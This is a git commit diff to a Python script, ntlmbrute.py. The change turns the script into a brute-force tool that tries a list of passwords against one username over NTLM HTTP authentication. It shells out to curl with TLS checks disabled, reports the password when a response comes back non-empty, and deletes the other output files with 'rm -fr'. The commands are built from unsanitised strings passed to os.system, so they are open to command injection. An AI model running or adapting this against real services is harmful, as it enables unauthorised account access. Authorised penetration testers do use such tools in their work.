aee55b9f4939ef427f7b415a15ce98f13719017d
ADMVA Team <52359512+admvateam@users.noreply.github.com>
2020-07-25 23:00:35 -0300

    Bruteforce Username
    Con un solo usuario, prueba una lista de password

--- ntlmbrute.py
+++ ntlmbrute.py
@@ -3,13 +3,18 @@ import os
 import sys
 
 users = open("usernames.txt","r").read().splitlines()
-
 passwords = open("passwords.txt","r").read().splitlines()
 i=0
 url = sys.argv[1]
 domain = ""
-cmd = "curl -k --ntlm -u "
-for user in users:
-	print("Attempting: " + domain + user.lower() + ":" + passwords[i])
-	os.system(cmd + domain + user.lower() + ":" + passwords[i] + " " + url + " -o " + user.lower() + ".html")
-	i+=1
+cmd = "curl -k -s --ntlm -u "
+for password in passwords:
+    print("Brute: " + domain + users[0] + ":" + password)
+    os.system(cmd + "'" + domain + users[0] + ":" + password + "' " + url + " -o " + password + ".html")
+    i+=1
+    if os.stat(password + ".html").st_size > 0:
+        print("Password:" + password)
+        exit()
+    else:
+        os.system("rm -fr " + password + ".html")
+
